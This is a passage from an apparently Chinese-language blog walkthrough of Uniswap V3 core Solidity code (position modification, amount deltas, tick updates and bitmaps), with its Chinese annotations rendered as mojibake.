class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs solidity">  /// @dev Effect some changes to a position<br>  /// @param params the position details and the change to the position's liquidity to effect<br>  /// @return position a storage pointer referencing the position with the given owner and tick range<br>  /// @return amount0 the amount of token0 owed to the pool, negative if the pool should pay the recipient<br>  /// @return amount1 the amount of token1 owed to the pool, negative if the pool should pay the recipient<br>  function _modifyPosition(ModifyPositionParams memory params)<br>      private<br>      noDelegateCall<br>      returns (<br>          Position.Info storage position,<br>          int256 amount0,<br>          int256 amount1<br>      )<br>  {<br>  //æ£€æŸ¥æµåŠ¨æ€§ä¸Šä¸‹é™æ˜¯å¦æ»¡è¶³æ¡ä»¶<br>      checkTicks(params.tickLower, params.tickUpper);<br><br>//è¯»å…¥å†…å­˜ï¼Œè¿™æ ·åç»­å¯ä»¥é€šè¿‡MLOADç›´æ¥è®¿é—®è€Œä¸ç”¨é‡æ–°å»åŠ è½½LOADï¼Œä»è€ŒèŠ‚çœgas<br>      Slot0 memory _slot0 = slot0; // SLOAD for gas optimization<br><br>//åˆ›å»ºæˆ–ä¿®æ”¹ç”¨æˆ·çš„positionï¼Œåé¢æœ‰ä»‹ç»<br>      position = _updatePosition(<br>          params.owner,<br>          params.tickLower,<br>          params.tickUpper,<br>          params.liquidityDelta,<br>          _slot0.tick<br>      );<br><br>      if (params.liquidityDelta != 0) {<br>          if (_slot0.tick &lt; params.tickLower) {<br>              // current tick is below the passed range; liquidity can only become in range by crossing from left to<br>              // right, when we'll need _more_ token0 (it's becoming more valuable) so user must provide it<br>              //å¦‚æœå½“å‰çš„trickå°äºtricklowerï¼Œåˆ™æ‰€æœ‰çš„token1å°†è½¬å˜ä¸ºtoken0<br>              //å³liquidity * (sqrt(upper) - sqrt(lower)) / (sqrt(upper) * sqrt(lower))<br>              amount0 = SqrtPriceMath.getAmount0Delta(<br>                  TickMath.getSqrtRatioAtTick(params.tickLower),<br>                  TickMath.getSqrtRatioAtTick(params.tickUpper),<br>                  params.liquidityDelta<br>              );<br>          } else if (_slot0.tick &lt; params.tickUpper) {<br>              // current tick is inside the passed range<br>              //å¦‚æœå½“å‰trickå°äºtrickupper<br>              uint128 liquidityBefore = liquidity; // SLOAD for gas optimization<br><br>              // write an oracle entry<br>              //å¢åŠ Oracleæ¡ç›®ï¼ˆé¢„è¨€æœºï¼‰<br>              (slot0.observationIndex, slot0.observationCardinality) = observations.write(<br>                  _slot0.observationIndex,<br>                  _blockTimestamp(),<br>                  _slot0.tick,<br>                  liquidityBefore,<br>                  _slot0.observationCardinality,<br>                  _slot0.observationCardinalityNext<br>              );<br><br>              //è®¡ç®—amout0å’Œamount1çš„å¢é‡<br>              amount0 = SqrtPriceMath.getAmount0Delta(<br>                  _slot0.sqrtPriceX96,<br>                  TickMath.getSqrtRatioAtTick(params.tickUpper),<br>                  params.liquidityDelta<br>              );<br>              amount1 = SqrtPriceMath.getAmount1Delta(<br>                  TickMath.getSqrtRatioAtTick(params.tickLower),<br>                  _slot0.sqrtPriceX96,<br>                  params.liquidityDelta<br>              );<br><br>//<br>              liquidity = LiquidityMath.addDelta(liquidityBefore, params.liquidityDelta);<br>          } else {<br>              // current tick is above the passed range; liquidity can only become in range by crossing from right to<br>              // left, when we'll need _more_ token1 (it's becoming more valuable) so user must provide it<br>              //å¦‚æœtrickè¶…è¿‡äº†trickupperåˆ™æ­¤æ—¶æ‰€æœ‰çš„token0å°†è½¬å˜ä¸ºtoken1<br>              //ä½¿ç”¨TickMath åº“ä¸­çš„ getSqrtRatioAtTick æ¥é€šè¿‡ tick index è®¡ç®—å…¶æ‰€å¯¹åº”çš„ä»·æ ¼<br>              amount1 = SqrtPriceMath.getAmount1Delta(<br>                  TickMath.getSqrtRatioAtTick(params.tickLower),<br>                  TickMath.getSqrtRatioAtTick(params.tickUpper),<br>                  params.liquidityDelta<br>              );<br>          }<br>      }<br>  }<br><br></code></pre></td></tr></table></figure><h3 id="getAmountDelta"><a href="#getAmountDelta" class="headerlink" title="getAmountDelta"></a>getAmountDelta</h3><p>åœ¨ <code>SqrtPriceMath</code> åº“ä¸­</p><p>åœ¨å…·ä½“çš„è®¡ç®—è¿‡ç¨‹ä¸­ï¼Œåˆ†æˆäº† RoundUp å’Œ RoundDown ä¸¤ç§æƒ…å†µï¼Œç®€å•æ¥è¯´ï¼š</p><ol><li>å½“æä¾›/å¢åŠ æµåŠ¨æ€§æ—¶ï¼Œä¼šä½¿ç”¨ RoundUpï¼Œè¿™æ ·å¯ä»¥ä¿è¯å¢åŠ æ•°é‡ä¸º L çš„æµåŠ¨æ€§æ—¶ï¼Œç”¨æˆ·æä¾›è¶³å¤Ÿçš„ token åˆ° pool ä¸­</li><li>å½“ç§»é™¤/å‡å°‘æµåŠ¨æ€§æ—¶ï¼Œä¼šä½¿ç”¨ RoundDownï¼Œè¿™æ ·å¯ä»¥ä¿è¯å‡å°‘æ•°é‡ä¸º L çš„æµåŠ¨æ€§æ—¶ï¼Œä¸ä¼šä» pool ä¸­ç»™ç”¨æˆ·å¤šä½™çš„ token</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs solidity">    /// @notice Gets the amount0 delta between two prices<br>    /// @dev Calculates liquidity / sqrt(lower) - liquidity / sqrt(upper),<br>    /// i.e. liquidity * (sqrt(upper) - sqrt(lower)) / (sqrt(upper) * sqrt(lower))<br>    /// @param sqrtRatioAX96 A sqrt price<br>    /// @param sqrtRatioBX96 Another sqrt price<br>    /// @param liquidity The amount of usable liquidity<br>    /// @param roundUp Whether to round the amount up or down<br>    /// @return amount0 Amount of token0 required to cover a position of size liquidity between the two passed prices<br>    function getAmount0Delta(<br>        uint160 sqrtRatioAX96,<br>        uint160 sqrtRatioBX96,<br>        uint128 liquidity,<br>        bool roundUp<br>    ) internal pure returns (uint256 amount0) {<br>        if (sqrtRatioAX96 &gt; sqrtRatioBX96) (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);<br><br>        uint256 numerator1 = uint256(liquidity) &lt;&lt; FixedPoint96.RESOLUTION;<br>        uint256 numerator2 = sqrtRatioBX96 - sqrtRatioAX96;<br><br>        require(sqrtRatioAX96 &gt; 0);<br><br>        return<br>            roundUp<br>            //è¿”å›ceil(x / y)<br>                ? UnsafeMath.divRoundingUp(<br>                //numerator1*numerator2/sqrtRatioBX96å¹¶å–æ•´<br>                    FullMath.mulDivRoundingUp(numerator1, numerator2, sqrtRatioBX96),<br>                    sqrtRatioAX96<br>                )<br>                : FullMath.mulDiv(numerator1, numerator2, sqrtRatioBX96) / sqrtRatioAX96;<br>    }<br><br>    /// @notice Gets the amount1 delta between two prices<br>    /// @dev Calculates liquidity * (sqrt(upper) - sqrt(lower))<br>    /// @param sqrtRatioAX96 A sqrt price<br>    /// @param sqrtRatioBX96 Another sqrt price<br>    /// @param liquidity The amount of usable liquidity<br>    /// @param roundUp Whether to round the amount up, or down<br>    /// @return amount1 Amount of token1 required to cover a position of size liquidity between the two passed prices<br>    function getAmount1Delta(<br>        uint160 sqrtRatioAX96,<br>        uint160 sqrtRatioBX96,<br>        uint128 liquidity,<br>        bool roundUp<br>    ) internal pure returns (uint256 amount1) {<br>        if (sqrtRatioAX96 &gt; sqrtRatioBX96) (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);<br><br>        return<br>            roundUp<br>                ? FullMath.mulDivRoundingUp(liquidity, sqrtRatioBX96 - sqrtRatioAX96, FixedPoint96.Q96)<br>                : FullMath.mulDiv(liquidity, sqrtRatioBX96 - sqrtRatioAX96, FixedPoint96.Q96);<br>    }<br>    <br>    /// @notice Helper that gets signed token0 delta<br>    /// @param sqrtRatioAX96 A sqrt price<br>    /// @param sqrtRatioBX96 Another sqrt price<br>    /// @param liquidity The change in liquidity for which to compute the amount0 delta<br>    /// @return amount0 Amount of token0 corresponding to the passed liquidityDelta between the two prices<br>    function getAmount0Delta(<br>        uint160 sqrtRatioAX96,<br>        uint160 sqrtRatioBX96,<br>        int128 liquidity<br>    ) internal pure returns (int256 amount0) {<br>        return<br>            liquidity &lt; 0<br>                ? -getAmount0Delta(sqrtRatioAX96, sqrtRatioBX96, uint128(-liquidity), false).toInt256()<br>                : getAmount0Delta(sqrtRatioAX96, sqrtRatioBX96, uint128(liquidity), true).toInt256();<br>    }<br><br>    /// @notice Helper that gets signed token1 delta<br>    /// @param sqrtRatioAX96 A sqrt price<br>    /// @param sqrtRatioBX96 Another sqrt price<br>    /// @param liquidity The change in liquidity for which to compute the amount1 delta<br>    /// @return amount1 Amount of token1 corresponding to the passed liquidityDelta between the two prices<br>    function getAmount1Delta(<br>        uint160 sqrtRatioAX96,<br>        uint160 sqrtRatioBX96,<br>        int128 liquidity<br>    ) internal pure returns (int256 amount1) {<br>        return<br>            liquidity &lt; 0<br>                ? -getAmount1Delta(sqrtRatioAX96, sqrtRatioBX96, uint128(-liquidity), false).toInt256()<br>                : getAmount1Delta(sqrtRatioAX96, sqrtRatioBX96, uint128(liquidity), true).toInt256();<br>    }<br>}<br></code></pre></td></tr></table></figure><h2 id="updatePosition"><a href="#updatePosition" class="headerlink" title="_updatePosition"></a>_updatePosition</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// @dev Gets and updates a position with the given liquidity delta<br>/// @param owner the owner of the position<br>/// @param tickLower the lower tick of the position's tick range<br>/// @param tickUpper the upper tick of the position's tick range<br>/// @param tick the current tick, passed to avoid sloads<br>function _updatePosition(<br>    address owner,<br>    int24 tickLower,<br>    int24 tickUpper,<br>    int128 liquidityDelta,<br>    int24 tick<br>) private returns (Position.Info storage position) {<br>//è·å–ç”¨æˆ·çš„position<br>    position = positions.get(owner, tickLower, tickUpper);<br><br>    uint256 _feeGrowthGlobal0X128 = feeGrowthGlobal0X128; // SLOAD for gas optimization<br>    uint256 _feeGrowthGlobal1X128 = feeGrowthGlobal1X128; // SLOAD for gas optimization<br><br>    // if we need to update the ticks, do it<br>    //æ ¹æ®ä¼ å…¥çš„å‚æ•°ä¿®æ”¹positionä¸­çš„lower/upper tick<br>    bool flippedLower;<br>    bool flippedUpper;<br>    if (liquidityDelta != 0) {<br>        uint32 time = _blockTimestamp();<br>        //è·å–è¯·æ±‚æ—¶é—´ç‚¹çš„Oracleæ•°æ®<br>        (int56 tickCumulative, uint160 secondsPerLiquidityCumulativeX128) =<br>            observations.observeSingle(<br>                time,<br>                0,<br>                slot0.tick,<br>                slot0.observationIndex,<br>                liquidity,<br>                slot0.observationCardinality<br>            );<br><br>        // æ›´æ–° lower tikc å’Œ upper tick<br>    // fippedX å˜é‡è¡¨ç¤ºæ˜¯æ­¤ tick çš„å¼•ç”¨çŠ¶æ€æ˜¯å¦å‘ç”Ÿå˜åŒ–ï¼Œå³<br>    // è¢«å¼•ç”¨ -&gt; æœªè¢«å¼•ç”¨ æˆ–<br>    // æœªè¢«å¼•ç”¨ -&gt; è¢«å¼•ç”¨<br>    // åç»­éœ€è¦æ ¹æ®è¿™ä¸ªå˜é‡çš„å€¼æ¥æ›´æ–° tick ä½å›¾<br>        flippedLower = ticks.update(<br>            tickLower,<br>            tick,<br>            liquidityDelta,<br>            _feeGrowthGlobal0X128,<br>            _feeGrowthGlobal1X128,<br>            secondsPerLiquidityCumulativeX128,<br>            tickCumulative,<br>            time,<br>            false,<br>            maxLiquidityPerTick<br>        );<br>        flippedUpper = ticks.update(<br>            tickUpper,<br>            tick,<br>            liquidityDelta,<br>            _feeGrowthGlobal0X128,<br>            _feeGrowthGlobal1X128,<br>            secondsPerLiquidityCumulativeX128,<br>            tickCumulative,<br>            time,<br>            true,<br>            maxLiquidityPerTick<br>        );<br><br>        // å¦‚æœä¸€ä¸ª tick ç¬¬ä¸€æ¬¡è¢«å¼•ç”¨ï¼Œæˆ–è€…ç§»é™¤äº†æ‰€æœ‰å¼•ç”¨<br>    // é‚£ä¹ˆæ›´æ–° tick ä½å›¾<br>        if (flippedLower) {<br>            tickBitmap.flipTick(tickLower, tickSpacing);<br>        }<br>        if (flippedUpper) {<br>            tickBitmap.flipTick(tickUpper, tickSpacing);<br>        }<br>    }<br><br>    (uint256 feeGrowthInside0X128, uint256 feeGrowthInside1X128) =<br>        ticks.getFeeGrowthInside(tickLower, tickUpper, tick, _feeGrowthGlobal0X128, _feeGrowthGlobal1X128);<br><br>    //æ›´æ–°position<br>    position.update(liquidityDelta, feeGrowthInside0X128, feeGrowthInside1X128);<br><br>    // clear any tick data that is no longer needed<br>    // å¦‚æœç§»é™¤äº†å¯¹ tick çš„å¼•ç”¨ï¼Œé‚£ä¹ˆæ¸…é™¤ä¹‹å‰è®°å½•çš„å…ƒæ•°æ®<br>// è¿™åªä¼šå‘ç”Ÿåœ¨ç§»é™¤æµåŠ¨æ€§çš„æ“ä½œä¸­<br>    if (liquidityDelta &lt; 0) {<br>        if (flippedLower) {<br>            ticks.clear(tickLower);<br>        }<br>        if (flippedUpper) {<br>            ticks.clear(tickUpper);<br>        }<br>    }<br>}<br><br></code></pre></td></tr></table></figure><h3 id="tick"><a href="#tick" class="headerlink" title="tick"></a>tick</h3><p>V3ä½¿ç”¨çš„ç­‰å¹‚æ•°åˆ—</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cos">p_{i}=<span class="hljs-number">1.0001</span><span class="hljs-symbol">^i</span><br><span class="hljs-comment">//è°ƒæ•´ä¸€ä¸‹</span><br>âˆšp_{i}=(âˆš<span class="hljs-number">1.0001</span>)<span class="hljs-symbol">^i</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>i</code> ä¹Ÿå°±æ˜¯ä»·æ ¼çš„åºå·ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸º <code>tick</code>ï¼Œè€Œç”±æ‰€æœ‰åºå·ç»„æˆçš„é›†åˆç§°ä¹‹ä¸º <code>Ticks</code>ã€‚åœ¨åˆçº¦ä»£ç ä¸­ï¼Œä¸»è¦æ˜¯ä»¥ tick æ¥è®°å½•æµåŠ¨æ€§çš„åŒºé—´ã€‚</p><p>åœ¨ <code>UniswapV3Pool</code> åˆçº¦ä¸­æœ‰ä¸¤ä¸ªçŠ¶æ€å˜é‡è®°å½•äº† tick ç›¸å…³çš„ä¿¡æ¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">    // tick å…ƒæ•°æ®ç®¡ç†çš„åº“<br>    using Tick for mapping(int24 =&gt; Tick.Info);<br>    // tick ä½å›¾æ§½ä½çš„åº“<br>    using TickBitmap for mapping(int16 =&gt; uint256);<br><br>    // è®°å½•äº†ä¸€ä¸ª tick åŒ…å«çš„å…ƒæ•°æ®ï¼Œè¿™é‡Œåªä¼šåŒ…å«æ‰€æœ‰ Position çš„ lower/upper ticks<br>    mapping(int24 =&gt; Tick.Info) public override ticks;<br>    // tick ä½å›¾ï¼Œå› ä¸ºè¿™ä¸ªä½å›¾æ¯”è¾ƒé•¿ï¼ˆä¸€å…±æœ‰ 887272x2 ä¸ªä½ï¼‰ï¼Œå¤§éƒ¨åˆ†çš„ä½ä¸éœ€è¦åˆå§‹åŒ–<br>    // å› æ­¤åˆ†æˆä¸¤çº§æ¥ç®¡ç†ï¼Œæ¯ 256 ä½ä¸ºä¸€ä¸ªå•ä½ï¼Œä¸€ä¸ªå•ä½ç§°ä¸ºä¸€ä¸ª word<br>    // map ä¸­çš„é”®æ˜¯ word çš„ç´¢å¼•<br>    mapping(int16 =&gt; uint256) public override tickBitmap;<br><br>library Tick {<br>    ...<br>    // tick ä¸­è®°å½•çš„æ•°æ®<br>    struct Info {<br>        // è®°å½•äº†æ‰€æœ‰å¼•ç”¨è¿™ä¸ª tick çš„ position æµåŠ¨æ€§çš„å’Œ<br>        uint128 liquidityGross;<br>        // å½“æ­¤ tick è¢«è¶Šè¿‡æ—¶ï¼ˆä»å·¦è‡³å³ï¼‰ï¼Œæ± å­ä¸­æ•´ä½“æµåŠ¨æ€§éœ€è¦å˜åŒ–çš„å€¼<br>        int128 liquidityNet;<br>        ...<br>    }<br></code></pre></td></tr></table></figure><p>tick ä½å›¾ç”¨äºè®°å½•æ‰€æœ‰è¢«å¼•ç”¨çš„ lower/upper tick indexï¼Œæˆ‘ä»¬å¯ä»¥ç”¨è¿‡ tick ä½å›¾ï¼Œä»å½“å‰ä»·æ ¼æ‰¾åˆ°ä¸‹ä¸€ä¸ªï¼ˆä»å·¦è‡³å³æˆ–è€…ä»å³è‡³å·¦ï¼‰è¢«å¼•ç”¨çš„ tick indexã€‚</p><p><a href="https://github.com/Uniswap/uniswap-v3-core/blob/2dc1eb9f251bad1c260d22dd392d8cedb2c6a4b5/contracts/libraries/TickBitmap.sol">tick ä½å›¾</a>æœ‰ä»¥ä¸‹å‡ ä¸ªç‰¹æ€§ï¼š</p><ul><li>å¯¹äºä¸å­˜åœ¨çš„ tickï¼Œä¸éœ€è¦åˆå§‹å€¼ï¼Œå› ä¸ºè®¿é—® map ä¸­ä¸å­˜åœ¨çš„ key é»˜è®¤å€¼å°±æ˜¯ 0</li><li>é€šè¿‡å¯¹ä½å›¾çš„æ¯ä¸ª word(uint256) å»ºç«‹ç´¢å¼•æ¥ç®¡ç†ä½å›¾ï¼Œå³è®¿é—®è·¯å¾„ä¸º word index -&gt; word -&gt; tick bit</li></ul><p><code>liquidityGross</code>: å¾ˆå¥½ç†è§£ï¼Œæ¯å½“æœ‰æµåŠ¨æ€§å°†è¯¥ tick è®¾ä¸ºä»·æ ¼åŒºé—´æ—¶ï¼Œä¸è®ºæ˜¯ä»·æ ¼ä¸Šé™è¿˜æ˜¯ä»·æ ¼ä¸‹é™ï¼Œ <code>liquidityGross</code> éƒ½ä¼šå¢åŠ ã€‚æ¢è¨€ä¹‹ï¼Œå½“ <code>liquidityGross &gt; 0</code> è¯´æ˜è¯¥ tick å·²ç»åˆå§‹åŒ–ï¼Œæ­£åœ¨è¢«æµåŠ¨æ€§ä½¿ç”¨ï¼Œè€Œ <code>liquidityGross == 0</code> åˆ™è¯¥ tick æœªåˆå§‹åŒ–ï¼Œæ²¡æœ‰æµåŠ¨æ€§ä½¿ç”¨ï¼Œè®¡ç®—æ—¶å¯ä»¥å¿½ç•¥ã€‚</p><p><code>liquidityNet</code> è¡¨ç¤ºå½“ä»·æ ¼ä»å·¦è‡³å³ç»è¿‡æ­¤ tick æ—¶æ•´ä½“æµåŠ¨æ€§éœ€è¦å˜åŒ–çš„å‡€å€¼ã€‚åœ¨å•ä¸ªæµåŠ¨æ€§ä¸­ï¼Œå¯¹äº lower tick æ¥è¯´ï¼Œå®ƒçš„å€¼ä¸ºæ­£ï¼Œå¯¹äº upper tick æ¥è¯´å®ƒçš„å€¼ä¸º è´Ÿã€‚</p><p>åœ¨æ³¨å…¥æˆ–ç§»é™¤æ•°é‡ä¸º <code>l</code> çš„æµåŠ¨æ€§æ—¶ï¼Œå…·ä½“è§„åˆ™å¦‚ä¸‹ï¼š</p><ul><li>æ³¨å…¥æµåŠ¨æ€§ï¼Œtick æ˜¯ä»·æ ¼ä¸‹é™ï¼Œ<code>liquidityNet</code> å¢åŠ  <code>l</code></li><li>æ³¨å…¥æµåŠ¨æ€§ï¼Œtick æ˜¯ä»·æ ¼ä¸Šé™ï¼Œ<code>liquidityNet</code> å‡å°‘ <code>l</code></li><li>ç§»é™¤æµåŠ¨æ€§ï¼Œtick æ˜¯ä»·æ ¼ä¸‹é™ï¼Œ<code>liquidityNet</code> å‡å°‘ <code>l</code></li><li>ç§»é™¤æµåŠ¨æ€§ï¼Œtick æ˜¯ä»·æ ¼ä¸Šé™ï¼Œ<code>liquidityNet</code> å¢åŠ  <code>l</code></li></ul><p>åœ¨Tick.solä¸­ï¼Œupdateç”¨äºæ›´æ–° tick å…ƒæ•°æ®ï¼Œæ­¤å‡½æ•°è¿”å›çš„ flipped è¡¨ç¤ºæ­¤ tick çš„å¼•ç”¨çŠ¶æ€æ˜¯å¦å‘ç”Ÿå˜åŒ–ï¼Œä¹‹å‰çš„ <code>_updatePosition</code> ä¸­çš„ä»£ç ä¼šæ ¹æ®è¿™ä¸ªè¿”å›å€¼å»æ›´æ–° tick ä½å›¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function update(<br>    mapping(int24 =&gt; Tick.Info) storage self,<br>    int24 tick,<br>    int24 tickCurrent,<br>    int128 liquidityDelta,<br>    uint256 feeGrowthGlobal0X128,<br>    uint256 feeGrowthGlobal1X128,<br>    uint160 secondsPerLiquidityCumulativeX128,<br>    int56 tickCumulative,<br>    uint32 time,<br>    bool upper,<br>    uint128 maxLiquidity<br>) internal returns (bool flipped) {<br>    Tick.Info storage info = self[tick];<br><br>    uint128 liquidityGrossBefore = info.liquidityGross;<br>    uint128 liquidityGrossAfter = LiquidityMath.addDelta(liquidityGrossBefore, liquidityDelta);<br><br>    require(liquidityGrossAfter &lt;= maxLiquidity, 'LO');<br><br>    //é€šè¿‡ liquidityGross åœ¨è¿›è¡Œ position å˜åŒ–å‰åçš„å€¼æ¥åˆ¤æ–­ tick æ˜¯å¦ä»è¢«å¼•ç”¨<br>    flipped = (liquidityGrossAfter == 0) != (liquidityGrossBefore == 0);<br><br>    if (liquidityGrossBefore == 0) {<br>        // by convention, we assume that all growth before a tick was initialized happened _below_ the tick<br>        if (tick &lt;= tickCurrent) {<br>            info.feeGrowthOutside0X128 = feeGrowthGlobal0X128;<br>            info.feeGrowthOutside1X128 = feeGrowthGlobal1X128;<br>            info.secondsPerLiquidityOutsideX128 = secondsPerLiquidityCumulativeX128;<br>            info.tickCumulativeOutside = tickCumulative;<br>            info.secondsOutside = time;<br>        }<br>        info.initialized = true;<br>    }<br><br>    info.liquidityGross = liquidityGrossAfter;<br><br>    // when the lower (upper) tick is crossed left to right (right to left), liquidity must be added (removed)<br>    //æ›´æ–°liquidityNetçš„å€¼<br>    info.liquidityNet = upper<br>        ? int256(info.liquidityNet).sub(liquidityDelta).toInt128()<br>        : int256(info.liquidityNet).add(liquidityDelta).toInt128();<br>}<br><br></code></pre></td></tr></table></figure><h3 id="tickspacing"><a href="#tickspacing" class="headerlink" title="tickspacing"></a>tickspacing</h3><p>V3 å¼•å…¥äº†è´¹ç‡ä¸‰æ¡£å¯é€‰ç­‰çº§å’Œç›¸åº”çš„ <code>tick</code> ç–å¯†ç¨‹åº¦ï¼Œä¹Ÿå°±æ˜¯ <code>tickspacing</code> ã€‚å¯¹äºæ¯ä¸€ç§äº¤æ˜“å¯¹è€Œè¨€ï¼Œéƒ½æœ‰ä¸‰æ¡£å¯é€‰è´¹ç‡ç­‰çº§ï¼Œ0.05%, 0.3%, 